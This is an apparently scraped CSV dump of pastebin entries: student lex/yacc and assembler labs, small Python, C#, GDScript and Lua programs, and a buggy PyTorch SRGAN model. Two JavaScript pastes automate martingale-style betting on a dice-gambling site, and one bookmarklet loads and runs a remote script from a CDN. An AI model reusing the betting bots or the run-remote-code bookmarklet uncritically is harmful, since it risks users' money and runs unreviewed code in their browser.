id,title,username,language,date,content
JcV2RnDc,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 05:12:18 AM CDT,"ile = open('3.txt')
B, N = map(int, file.readline().split())
a = []
for i in range(N):
    st, r = map(int, file.readline().split())
    a.append((st, st + r, r))
###################################### 
a.sort(key = lambda a: a[0])
######################################
bank = [0] * B
bank_count = [0] * B
last = 0
for i in range(N):
    st, end, r = a[i]
    for j in range(B):
        if bank[j] <= st:
            bank[j] = end
            if st <= 1440:
                bank_count[j] += 1
                last = st
            break
    else:
        m = min(bank)
        for j in range(B):
            if bank[j] == m:
                if bank[j] <= 1440:
                    bank_count[j] += 1
                    last = bank[j]
                bank[j] = bank[j] + r
                break
print(max(bank_count), last)"
rEmRkmBf,farts back snowybot no brainfarts,coinwalk,JavaScript,Wednesday 1st of May 2024 05:12:05 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var dividedby = 1000;
var monkey = Number((olsenest/dividedby).toFixed(8));
var dust = (monkey/2);
var bolux = monkey;
var tens = (monkey*10);
var hundreds = (monkey*200);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var olsen = 0;
var chickendinner = (olsenest*24);
var belance = olsenest;
var solvert = olsenest;
var silvery = ((Math.floor(olsenest/tens))*tens);
var bob = false;
var fart = 4;
 
function go(){
belance = document.getElementById('pct_balance').value;
var dog = Number((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if (((((belance-solvert)-hundreds)-(bolux*2))<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 0;
    solvert = parseFloat(belance);
}
if ((((belance>=(silvery+(tens*fart)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 4;
    solvert = parseFloat(belance);
silvery = ((Math.floor(belance/tens))*tens);
}
if (belance>=chickendinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();
"
qk7tDQkq,SSDC,opurag,C,Wednesday 1st of May 2024 05:08:32 AM CDT,"
------------------------------------------------------------------------------------------------------------------------
//1
//1a:Program to count the number, words, spaces and lines in a given input file

%{
#include<stdio.h>
int c=0;
int w=0;
int s=0;
int l=0;
%}
%%
"" "" { s++; w++;}
[\n] {l++;w++;}
[\t\n] {w++;}
[^\t\n] {c++;}
%%
int yywrap()
{
return 1;
}
int main()
{
 yyin=fopen(""Info.txt"", ""r"");
 yylex();
 printf(""Characters = %d\nWords = %d\nSpaces = %d\nLines= %d\n"",c,w,s,l);
 return 0;
}

//op
lex 1a.l
cc lex.yy.c -ll
./a.out

//1b:Program to recognize and count the number of identifiers in a file

%{
#include<stdio.h>
int i=0;
%}
digit [0-9]
letter [a-z A-Z_]
%%
{letter}({letter}|{digit})* {i++;}
{digit}({letter}|{digit})* {i;}
%%
int main()
{
printf(""Enter the values:\n"");

yylex();
printf(""Number of identifiers = %d\n"", i);
return 0;
}

//op
lex 1b.l
cc lex.yy.c -ll
./a.out

// ctrl+d to end loop
------------------------------------------------------------------------------------------------------------------------
//2
//2a:Programs to count the numbers of comments lines in a given C program. Also eliminate them and copy the resulting program into separate file.

%{
#include<stdio.h>
int ml=0;
int sl=0;
%}

%%

""/*""[a-z A-Z 0-9 ' ' \t \n]*""*/"" ml++;
""//"".* sl++;

%%
int main()
{
yyin=fopen(""f1.txt"",""r"");
yyout=fopen(""f2.txt"",""w"");
yylex();
fclose(yyin);
fclose(yyout);
printf(""Number of single line comments =%d\n"",sl);
printf(""Number of multi line comments =%d\n"",ml);
}

//op
gedit f1.txt
lex 2a.l
cc lex.yy.c -ll
cat f2.txt


//2b: Program to recognize whether a given sentence is simple or compound.

%{
#include<stdio.h>
int c=0;
%}

%%
[a-zA-Z]*[ ](and|or|but|yet|so)[ ][a-zA-Z]* {c=1;}
.|[\n];

%%
int yywrap()
{
  return 1;
}

void main()
{
 printf(""enter the text\n"");
 yylex();
 if(c)
 {
  printf(""The given statement is compound\n"");
 }
 else
 {
  printf(""The given statement is simple\n"");
 }
}


//op
lex 2b.l
cc lex.yy.c -ll
./a.out

------------------------------------------------------------------------------------------------------------------------
//3
//3a: Program to count number of:
 //    i.+ve and -ve integers
 //    ii. +ve and -ve fractions

%{
#include<stdio.h>
int pi=0,ni=0,pf=0,nf=0;
%}
%%
[-][0-9]+ {ni++;}
[+]?[0-9]+ {pi++;}
[-][0-9]*\.[0-9]+ {nf++;}
[+]?[0-9]*\.[0-9]+ {pf++;}
%%

void main(int argc,char *argv[])
{
if(argc!=2)
{
printf(""usage :./a.out in.txt \n"");
exit(0);
}
yyin=fopen(argv[1],""r"");
yylex();
printf(""Number of positive integer %d\n"",pi);
printf(""Number of negative integer %d\n"",ni);
printf(""Number of positive fraction %d\n"",pf);
printf(""Number of negative fraction %d\n"",nf);
}
int yywrap(){
return 1;
}

//in.txt
12
-29
0
+8
-0.9

//op
lex 3a.l
cc lex.yy.c -ll
./a.out in.txt


//3b: Program to count the number of “scanf” and “printf” statements in a C program. Replace them with “readf” and “writef” statements respectively.

%{
#include<stdio.h>
int sf=0,pf=0;
%}
%%
""scanf"" {sf++; fprintf(yyout,""readf"");}
""printf"" {pf++; fprintf(yyout,""writef"");}
%%

int main()
{
yyin=fopen(""f1.c"",""r"");
yyout=fopen(""f2.c"",""w"");
yylex();
printf(""no of scanf =%d\n no of printf =%d\n"",sf,pf);
return 0;
}

//op
gedit f1.c
lex 3b.l
cc lex.yy.c -ll
./a.out
cat f2.c

------------------------------------------------------------------------------------------------------------------------
//4: Program to evaluate arithmetic expression involving operators +, -, *, /
//4.l
%{
#include ""y.tab.h""
extern yylval;
%}
%%
[0-9]+ {yylval=atoi(yytext);return num;}
[\+\-\*\/] {return yytext[0];}
[)] {return yytext[0];}
[(] {return yytext[0];}
. {;}
\n {return 0;}
%%

//4.y
%{
#include<stdio.h>
#include<stdlib.h>
%}
%name parse
%token num
%left'+''-'
%left'*''/'
%%
input:exp {printf(""%d\n"",$$);exit(0);}
exp:exp'+'exp{$$=$1+$3;}
|exp'-'exp{$$=$1-$3;}
|exp'*'exp{$$=$1*$3;}
|exp'/'exp{if($3==0){printf(""Divide by zero error\n "");exit(0);}
else
$$=$1/$3;}
|'('exp')'{$$=$2;}
|num{$$=$1;};
%%
int yyerror()
{
printf(""error"");
exit(0);
}
int main()
{
printf(""Enter an expression:\n"");
yyparse();
}
  
  
//op
lex 4.l
yacc -d 4.y
cc lex.yy.c y.tab.c -lfl
./a.out

------------------------------------------------------------------------------------------------------------------------
//5: Program to recognize a valid variable which starts with a letter, followed by any number of letter or digits
//p5.l
%{
#include ""y.tab.h""
%}
%%
[a-zA-z] return L;
[0-9] return D;

%%

//p5.y
%{
#include<stdio.h>
#include<stdlib.h>
%}
%name parse
%token L D

%%
var:L E {printf(""Valid Variable\n""); return 0;}
E:E L;
|E D;
| ;
%%

int main()
{
printf(""Type the variable\n"");
yyparse();
return 0;
}
int yyerror()
{
printf(""Invalid Variable\n"");
exit(0);
}

//op
lex p5.l
yacc -d p5.y
cc lex.yy.c y.tab.c -lfl
./a.out

------------------------------------------------------------------------------------------------------------------------
//6: Program to recognize the strings using the grammar (a^nb^n ; n>=0)
//p6.l
%{
#include ""y.tab.h""
%}
%%
a return A;
b return B;
. return yytext[0];
\n return yytext[0];
%%

//p6.y
%{
#include<stdio.h>
#include<stdlib.h>
%}
%name parse
%token A B

%%
Str:S '\n' {return 0;}
S:A S B;

| ;
%%

int main()
{
printf(""Type the string\n"");
if (!yyparse())
printf(""Valid String\n"");
return 0;
}
int yyerror()
{
printf(""Invalid String\n"");
exit(0);
}

//op
lex p6.l
yacc -d p6.y
cc lex.yy.c y.tab.c -lfl
./a.out
------------------------------------------------------------------------------------------------------------------------

//7: C program to implement Pass1 of Assembler

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void main() {
  char opcode[10], operand[10], label[10], code[10], mnemonic[3];
  int locctr, start, length;

  FILE *fp1, *fp2, *fp3, *fp4;

  fp1 = fopen(""input.txt"", ""r"");
  fp2 = fopen(""optab.txt"", ""r"");
  fp3 = fopen(""symtabl.txt"", ""w"");
  fp4 = fopen(""out.txt"", ""w"");

  fscanf(fp1, ""%s\t%s\t%s"", label, opcode, operand);

  if (strcmp(opcode, ""START"") == 0) {
    start = atoi(operand);
    locctr = start;
    fprintf(fp4, ""\t%s\t%s\t%s\n"", label, opcode, operand);
    fscanf(fp1, ""%s\t%s\t%s"", label, opcode, operand);
  } else
    locctr = 0;

  while (strcmp(opcode, ""END"") != 0) {
    fprintf(fp4, ""%d\t"", locctr);

    if (strcmp(label, ""**"") != 0) fprintf(fp3, ""%s\t%d\n"", label, locctr);
    fscanf(fp2, ""%s\t%s"", code, mnemonic);

    while (strcmp(code, ""END"") != 0) {
      if (strcmp(opcode, code) == 0) {
        locctr += 3;
        break;
      }
      fscanf(fp2, ""%s\t%s"", code, mnemonic);
    }
    if (strcmp(opcode, ""WORD"") == 0)
      locctr += 3;
    else if (strcmp(opcode, ""RESW"") == 0)
      locctr += (3 * (atoi(operand)));
    else if (strcmp(opcode, ""RESB"") == 0)
      locctr += atoi(operand);
    else if (strcmp(opcode, ""BYTE"") == 0)
      ++locctr;
    fprintf(fp4, ""%s\t%s\t%s\t\n"", label, opcode, operand);
    fscanf(fp1, ""%s\t%s\t%s"", label, opcode, operand);
  }
  fprintf(fp4, ""%d\t%s\t%s\t%s\n"", locctr, label, opcode, operand);
  length = locctr - start;
  printf(""The length of the code:%d\n"", length);

  fclose(fp1);
  fclose(fp2);

  fclose(fp3);
  fclose(fp4);
}

//1.Input.txt
**	START	2000
**	LDA	FIVE
**	STA	ALPHA
**	LDCH	CHARZ
**	STCH	C1
ALPHA	RESW	2
FIVE	WORD	5
CHARZ	BYTE	C'Z'
C1	RESB	1
**	END	**

//2.Optab.txt
START	*
LDA	03
STA	0f
LDCH	53
STCH	57
END	*

//op
gcc p7.c
./a.out
cat Symtabl.txt
cat Out.txt
------------------------------------------------------------------------------------------------------------------------

//8: C program to implement Absolute loader.

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
void main() {
	FILE *fp;
	int i,l, j, staddrl;
	char name[10], line[50], namel[10], staddr[10];
	printf(""enter program name: "");
	scanf(""%s"", name);
	fp = fopen(""abssrc.txt"", ""r"");
	fscanf(fp, ""%s"", line);
	for(i=2, j=0; i<8, j<6; i++, j++) {
		namel[j] = line[i];
	}
	namel[i] = '\0';
	printf(""name from obj: %s\n"", namel);
	if(strcmp(name,namel) == 0) {
		do {
			fscanf(fp, ""%s"", line);
			if(line[0] == 'T') {
				for(i=2, j=0; i<8, j<6; i++, j++) {
					staddr[j] = line[i];
				}
				staddr[j] = '\0';
				staddrl = atoi(staddr);
				i=12;
				while(line[i] != '$') {
					if(line[i] != '^') {
						printf(""00%d\t%c%c\n"", staddrl, line[i], line[i+1]);
						staddrl++;
						i = i+2;
					} else {
						i++;
					}
				}
			} else if (line[0] == 'E') {
				break;
 
			}
		}while(!feof(fp));
		fclose(fp);
	}
}
 
 
 //abssrc.txt
H^00COPY^001000
T^001000^3C^001011^10121A^11222B$
T^002000^2E^101B2A^0C123A$
E^001000
(or)
H^SAMPLE^001000^0035
T^001000^0C^001003^071009$
T^002000^03^111111$
E^001000

//op
./a.out
00COPY (or) SAMPLE

------------------------------------------------------------------------------------------------------------------------
"
yDA8xvVB,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 05:07:21 AM CDT,"file = open('3.txt')
B, N = map(int, file.readline().split())
a = []
for i in range(N):
    st, r = map(int, file.readline().split())
    a.append((st, st + r, r))
a.sort()
bank = [0] * B
bank_count = [0] * B
last = 0
for i in range(N):
    st, end, r = a[i]
    for j in range(B):
        if bank[j] <= st:
            bank[j] = end
            if st <= 1440:
                bank_count[j] += 1
                last = st
            break
    else:
        m = min(bank)
        for j in range(B):
            if bank[j] == m:
                if bank[j] <= 1440:
                    bank_count[j] += 1
                    last = bank[j]
                bank[j] = bank[j] + r
                break
print(max(bank_count), last)"
26NsSCh5,Untitled,ChrisDunamis,Python,Wednesday 1st of May 2024 04:57:05 AM CDT,"import torch

from torch import nn

print(""torch Version:"", torch.__version__)


class ConvolutionalBlock(nn.Module):
    def __init__(self, input_channels, output_channels, discriminator=False, use_activation=True,
                 use_batch_normalization=True, **kwargs):

        super().__init__()

        self.use_activation = use_activation
        self.cnn = nn.Conv2d(input_channels, output_channels, **kwargs, bias=not use_batch_normalization)
        self.use_batch_normalization = nn.BatchNorm2d(output_channels) if use_batch_normalization else nn.Identity()
        self.use_activation = (
            nn.LeakyReLU(0.2, inplace=True) if discriminator else nn.PReLU(num_parameters=output_channels)
        )

    def forward(self, x):
        return self.use_activation(self.use_batch_normalization(self.cnn(x)) if self.use_activation else 
                                   self.use_batch_normalization(self.cnn(x)))
    
    
class UpsampleBlock(nn.Module):
    def __init__(self, input_channels, scale_factor):

        super().__init__()

        self.convolutional_layer =  nn.Conv2d(input_channels, (input_channels * scale_factor) ** 2, 2, 3, 1, 1)
        # Where, Input Channels * 4, Height, Width --> Input Channels, Height * 2, Width * 2:
        self.pixel_shuffle = nn.PixelShuffle(scale_factor)
        self.activation = nn.PReLU(num_parameters=input_channels)
    
    def forward(self, x):
        return self.activate(self.pixel_shuffle(self.convolutional_layer(x)))
    
    
class ResidualBlock(nn.Module):
    def __init__(self, input_channels):

        super().__init__()

        self.block1 = ConvolutionalBlock(input_channels, input_channels, kernel_size=3, stride=1, padding=1)
        self.block2 = ConvolutionalBlock(input_channels, input_channels, kernel_size=3, stride=1, padding=1, 
                                         use_activation=False)
    
    def forward(self, x):
        output = self.block1(x)
        output = self.block2(output)

        return output + x
    
    
class Generator(nn.Module):
    def __init__(self, input_channels=3, number_of_channels=64, number_of_blocks=16):

        super().__init__()

        self.initialize = ConvolutionalBlock(input_channels, number_of_channels, kernel_size=9, stride=1, padding=4, 
                                             use_batch_normalization=False)
        self.residual_layers = nn.Sequential(*[ResidualBlock(number_of_channels) for _ in range(number_of_blocks)])
        self.convolutional_block = ConvolutionalBlock(input_channels, number_of_channels, kernel_size=9, stride=1, 
                                                      padding=4, use_activation=False)
        self.upsamples = nn.Sequential(UpsampleBlock(number_of_channels, 2), UpsampleBlock(number_of_channels, 2))
        self.final_layer = nn.Conv2d(number_of_channels, input_channels, kernel_size=9, stride=1, padding=4)
    
    def forward(self, x):
        initialise = self.initialize(x)
        x = self.residual_layers(initialise)
        x = self.convolutional_block(x) + initialise
        x = self.upsamples(x)

        return torch.tanh(self.final_layer(x))
    
    
class Discriminator(nn.Module):
    def __init__(self, input_channels=3, features=[64, 64, 128, 128, 256, 256, 512, 512]):
        
        super().__init__()

        blocks = []
        
        for idx, feature in enumerate(features):
            blocks.append(
                ConvolutionalBlock(
                    input_channels, feature, kernel_size=3, stride=1 + (idx % 2), padding=1, discriminator=True, 
                    use_activation=True, use_batch_normalization=False if idx == 0 else True
                )
            )
            input_channels = feature

        self.blocks = nn.Sequential(*blocks)
        self.classifier = nn.Sequential(
            nn.AdaptiveAvgPool2d((6, 6)), 
            nn.Flatten(), 
            nn.Linear((512 * 6 * 6), 1024), 
            nn.LeakyReLU(0.2, inplace=True), 
            nn.Linear(1024 * 1)
        )
    
    def forward(self, x):
        x = self.blocks(x)

        return self.classifier(x)
    
    
def test():
    low_resolution = 24

    with torch.cuda.amp.autocast():
        x = torch.randn(5, 3, low_resolution, low_resolution)
        generator = Generator()
        generator_output = generator(x)  # <--- The error points here
        discriminator = Discriminator()
        discriminator_output = discriminator(generator_output)

        print(""Generator Output Shape:     {}"".format(generator_output.shape) + ""\n"" + 
              ""Discriminator Output Shape: {}"".format(discriminator_output.shape))


test()"
d8ANSS4X,SgPokeMap Filter PvP,name8888less,JavaScript,Wednesday 1st of May 2024 04:52:28 AM CDT,"javascript:$.getScript(""https://cdn.jsdelivr.net/gh/name8888less/sgpokemap-addons@fdba83209631fdf67d850931094f49b1b9f576c4/filter_mons.min.js"", function(data, textStatus, jqxhr) {});"
7WNtGRK1,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 04:42:25 AM CDT,"file = open('2.txt')
N, L, M = map(int, file.readline().split())
a = []
for i in range(N):
    st, r, t = file.readline().split()
    a.append((int(st), int(st) + int(r), t))
a.sort()
park = [0] * (L + M)
bus = 0
left = 0
for i in range(N):
    st, end, t = a[i]
    if t == ""A"":
        for j in range(L + M):
            if park[j] <= st:
                park[j] = end
                break
        else:
            left += 1
    if t == 'B':
        for j in range(L, L + M):
            if park[j] <= st:
                park[j] = end
                bus += 1
                break
        else:
            left += 1
print(bus, left)"
Rivw9auv,Edit bars,SaNik74,C#,Wednesday 1st of May 2024 04:29:48 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        string nameHealthBar = ""Health"";
        string nameArmorBar = ""Armor"";
        string nameStaminaBar = ""Stamina"";
        string nameAmmoBar = ""Ammo"";
        int percentHealth = 60;
        int percentArmor = 100;
        int percentStamina = 20;
        int percentAmmo = 80;

        EditBar(nameHealthBar, percentHealth, ConsoleColor.Red, 0, 0);
        EditBar(nameArmorBar, percentArmor, ConsoleColor.DarkYellow, 12, 0);
        EditBar(nameStaminaBar, percentStamina, ConsoleColor.DarkBlue, 0, 3);
        EditBar(nameAmmoBar, percentAmmo, ConsoleColor.DarkGray, 12, 3);
    }

    static void EditBar(string nameBar, int precentOccupancy, ConsoleColor color, int positionX, int positionY, int maxValue = 10)
    {
        int hundredPercent = 100;
        int startingLinePosition = 0;

        if (precentOccupancy > 100)
        {
            precentOccupancy = 100;
        }

        ConsoleColor defaultColour = Console.BackgroundColor;
        string bar = """";
        int occupancyValue = maxValue * precentOccupancy / hundredPercent;

        DrawBar(startingLinePosition, occupancyValue, ref bar);

        Console.SetCursorPosition(positionX, positionY);
        Console.Write('[');
        Console.BackgroundColor = color;
        Console.Write(bar);
        Console.BackgroundColor = defaultColour;
        bar = """";

        DrawBar(occupancyValue, maxValue, ref bar);

        Console.Write($""{bar}]"");
        Console.SetCursorPosition(positionX + 3, positionY + 1);
        Console.Write(nameBar);
    }

    static void DrawBar(int startingPositionOfLine, int endOfLine, ref string bar)
    {
        for (int i = startingPositionOfLine; i < endOfLine; i++)
        {
            bar += ' ';
        }
    }
}"
xnpDNMyU,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 04:19:02 AM CDT,"file = open('1.txt')
K = int(file.readline())
N = int(file.readline())
a = []
for i in range(N):
    st, end = map(int, file.readline().split())
    a.append((st, end))
a.sort()
camera = [0] * K
count = 0
last_camera = 0
for i in range(N):
    st, end = a[i]
    for j in range(K):
        if camera[j] < st:
            camera[j] = end
            count += 1
            last_camera = j + 1
            break
print(count, last_camera)"
q7HYEac0,correct number of plies between fen1 a fen2,max2201111,Python,Wednesday 1st of May 2024 04:08:03 AM CDT,"import chess

def simplify_fen_string(fen):
    """"""Odstraní z FEN řetězce části týkající se počtu tahů, zachovává pozici, hráče na tahu, rošády a en passant.""""""
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachováváme informace o pozici, hráči na tahu, rošádách a en passant
    return simplified_fen

def bfs_shortest_path(start_fen, goal_fen):
    """"""Vyhledává nejkratší cestu mezi dvěma FEN pozicemi pomocí BFS algoritmu.""""""
    start_fen = simplify_fen_string(start_fen)  # Zjednodušení vstupního FEN
    goal_fen = simplify_fen_string(goal_fen)  # Zjednodušení cílového FEN
    board = chess.Board(start_fen)
    queue = [(board, 0)]  # fronta pro BFS, obsahuje dvojice (šachovnice, hloubka)
    visited = set()
    visited.add(start_fen)
    
    while queue:
        current_board, depth = queue.pop(0)
        current_fen = simplify_fen_string(current_board.fen())
        if current_fen == goal_fen:
            return depth
        
        for move in current_board.legal_moves:
            current_board.push(move)
            fen = simplify_fen_string(current_board.fen())
            if fen not in visited:
                visited.add(fen)
                queue.append((current_board.copy(), depth + 1))
            current_board.pop()
    
    return None  # cesta nebyla nalezena

# Zadání FEN pozic
start_fen = ""8/5k2/8/8/8/8/8/1KQ5 w - - 0 1""
goal_fen = ""8/8/5k2/8/8/4Q3/8/1K6 w - - 0 1""

# Spuštění BFS vyhledávání
path_length = bfs_shortest_path(start_fen, goal_fen)
print(f""Nejkratší cesta z {start_fen} do {goal_fen} je {path_length} tahů."")
"
cLsczTjq,ReadInt Func,SaNik74,C#,Wednesday 1st of May 2024 03:34:07 AM CDT,"namespace ReadInt
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int number = GetNumber();
            Console.WriteLine($""Вы ввели число - {number}"");
        }

        public static int GetNumber()
        {
            bool isWorking = true;
            int number = 0;

            while (isWorking)
            {
                Console.WriteLine(""Введите число"");

                bool isSuccess = int.TryParse(Console.ReadLine(), out number);

                if (isSuccess)
                {
                    isWorking = false;
                }
                else
                {
                    Console.WriteLine(""Ошибка, нужно вводить число. Повторите еще раз."");
                    Console.ReadKey();
                    Console.Clear();
                }
            }

            return number;
        }
    }
}"
xeyDLbKQ,snowy robo manual,coinwalk,JavaScript,Wednesday 1st of May 2024 03:28:04 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var dividedby = 1000;
var rift = (dividedby/25);
var monkey = Number((olsenest/dividedby).toFixed(8));
var dust = (monkey/2);
var bolux = monkey;
var tens = (monkey*10);
var hundreds = (monkey*200);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var olsen = 0;
var chickendinner = (olsenest*24);
var belance = olsenest;
var solvert = olsenest;
var silvery = olsenest;
var bob = false;
 
function go(){
belance = document.getElementById('pct_balance').value;
var dog = Number((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if ((((belance-(solvert-hundreds))-(bolux*2))<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    solvert = parseFloat(belance);
silvery= parseFloat(belance);
}
if (((belance-(bolux*rift))<=0)&&(belance>=silvery)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    solvert = parseFloat(belance);
silvery= parseFloat(belance);
}
if (belance>silvery){
silvery= parseFloat(belance);
}
if (belance>=chickendinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();
"
mQ0MTDrn,111,NeshZul,GDScript,Wednesday 1st of May 2024 03:03:39 AM CDT,"extends KinematicBody2D


var bullet = load(""res://bullet_laser.tscn"")

var score = 0
var dir
var turn_speed = 0.02

var speed = 1800
var friction = 0.008
var acceleration = 0.004
var velocity = Vector2.ZERO


onready var damp_effect = $Thrust_patricles.get_process_material()
onready var gun_laser = $gun_laser
onready var tween = $Tween
onready var camera =$Camera2D

var zoom_1 = Vector2(1,1)
var zoom_5 = Vector2(5,5)
var zoom_max = Vector2(30,30)

func _ready():
	GameState.player = self
func _process(delta):
	var gun_laser_pos = gun_laser.position
	damp_effect.damping = 100 - (velocity.length())
#	print(velocity.length())
	_rotate()
	var input_velocity = Vector2.ZERO
	# Check input for ""desired"" velocity
	if Input.is_action_pressed(""lean_right""):
		input_velocity.x += 1
	if Input.is_action_pressed(""lean_left""):
		input_velocity.x -= 1
	if Input.is_action_pressed(""back""):
		input_velocity.y += 1
	if Input.is_action_pressed(""forward""):
		input_velocity.y -= 1


	input_velocity = input_velocity.normalized() * speed

	if Input.is_action_just_pressed(""friction_off""):
		friction = 0.000000000000001
	if Input.is_action_just_released(""friction_off""):
		friction = 0.008
	if Input.is_action_just_released(""click_right""):
		var dir_bullet = (get_global_mouse_position() - position).normalized()
		var instance_bullet= bullet.instance()
		instance_bullet.position = gun_laser.get_global_transform().origin
		instance_bullet.rotation = gun_laser.rotation
		if velocity.length() > 300:
			instance_bullet.dir = dir_bullet * velocity.length()/100
		else:
			instance_bullet.dir = dir_bullet *2
		get_parent().add_child(instance_bullet)

	# If there's input, accelerate to the input velocity
	if input_velocity.length() > 0:
		velocity = velocity.linear_interpolate(input_velocity, acceleration)
	else:
		# If there's no input, slow down to (0, 0)
		velocity = velocity.linear_interpolate(Vector2.ZERO, friction)
	velocity = move_and_slide(velocity)

func _rotate():
	dir = get_angle_to(get_global_mouse_position())
	if abs(dir) < turn_speed:
		rotation += dir
	else:
		if dir > 0: rotation += turn_speed #clockwise
		if dir < 0: rotation -= turn_speed #anit - clockwise

func _input(event):
	if event is InputEventMouseButton:
		if camera.zoom == zoom_1 and event.button_index == BUTTON_WHEEL_DOWN:
			## smooth
			tween.stop_all()
			tween.interpolate_property(camera, ""zoom"" , zoom_1,  zoom_5, 0.25,Tween.TRANS_CUBIC )
			tween.start()
		if camera.zoom == zoom_5 and event.button_index == BUTTON_WHEEL_UP:
			tween.stop_all()
			tween.interpolate_property(camera, ""zoom"" , zoom_5,  zoom_1, 0.25,Tween.TRANS_CUBIC )
			tween.start()
"
76hLjJa2,Zoe's Reactor Controller,TwitchBlade,Lua,Wednesday 1st of May 2024 02:13:29 AM CDT,"function handleReactor()
  while true do
    if (r.getDamagePercent() > 0) and r.getStatus() then
      r.scram()
      cb.sendMessage(""Zoe's Reactor shut down due to damage"", ""Reactor Monitor"")
      term.setCursorPos(1,1)
      term.write(""Reactor Damage : "" .. r.getDamagePercent() .. ""%     "")
    else
      term.setCursorPos(1,1)
      term.write(""Reactor Damage : "" .. r.getDamagePercent() .. ""%     "")
    end
  end
end

function waitForPlayerJoin()
  local event, username, dimension = os.pullEvent(""playerJoin"")
  if username==""zozerelli"" then
    os.sleep(10)
    if r.getStatus() then
      cb.sendMessage(""Zoe's Reactor is running normally at "" .. r.getBurnRate() .. ""mb/t"", ""Reactor Monitor"")
    else
      cb.sendMessage(""Zoe's Reactor is shut down, maintenence required!"", ""Reactor Monitor"")
    end
  end
end





r = peripheral.wrap(""back"")
cb = peripheral.wrap(""left"")
pd = peripheral.wrap(""right"")
term.clear()
while true do
  parallel.waitForAny(handleReactor, waitForPlayerJoin)
  os.sleep(0.05)
end"
